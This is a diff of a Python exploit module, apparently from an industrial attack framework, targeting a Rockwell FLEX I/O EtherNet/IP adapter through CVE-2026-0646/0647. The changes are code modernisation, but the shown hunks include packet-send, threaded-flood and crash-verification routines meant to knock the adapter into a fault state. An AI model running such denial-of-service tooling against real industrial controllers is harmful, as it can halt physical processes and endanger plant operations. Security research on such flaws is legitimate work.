@@ -30,14 +30,12 @@ References:
   - https://www.cisa.gov/ics-advisories/ (ICSA-26-167-05)
 Affected: Rockwell Automation 1794-AENTR FLEX I/O EtherNet/IP Adapter, V2.012
 """
-from __future__ import annotations
 
 import logging
 import socket
 import struct
 import time
 import threading
-from typing import List
 
 from industrialxpl.core.exploit import Exploit, OptInteger, OptString
 
@@ -154,7 +152,7 @@ class Exploit(Exploit):
                 return f"EtherNet/IP port {self.port} open - no identity data"
         except ConnectionRefusedError:
             return f"Port {self.port} closed at {self.target}"
-        except socket.timeout:
+        except TimeoutError:
             return f"Timeout at {self.target}:{self.port}"
         except Exception as exc:
             return f"Check error: {exc}"
@@ -192,7 +190,7 @@ class Exploit(Exploit):
                             logger.info("[*] Pkt %d: %d bytes, last byte=0x%02x", i + 1, len(resp), status)
                         else:
                             logger.info("[*] Pkt %d: empty response", i + 1)
-                    except socket.timeout:
+                    except TimeoutError:
                         logger.info("[+] Pkt %d: timeout - adapter may be faulting (CVE-2026-0646)", i + 1)
             except ConnectionRefusedError:
                 logger.info("[+] Connection refused after pkt %d - adapter likely crashed", i + 1)
@@ -202,7 +200,7 @@ class Exploit(Exploit):
             time.sleep(0.3)
 
     def _exploit_cve_0647(self) -> None:
-        threads: List[threading.Thread] = []
+        threads: list[threading.Thread] = []
         n_threads = int(self.flood_threads)
         n_count = int(self.flood_count)
         host = str(self.target)
@@ -240,7 +238,7 @@ class Exploit(Exploit):
                     logger.info("[*] Adapter still responding (%d bytes) - may require increased count", len(resp))
         except ConnectionRefusedError:
             logger.info("[+] CONFIRMED: Port closed - FLEX I/O adapter in fault state (power cycle required)")
-        except socket.timeout:
+        except TimeoutError:
             logger.info("[+] Timeout - adapter likely unresponsive")
         except Exception as exc:
             logger.warning("[*] Verify error: %s", exc)
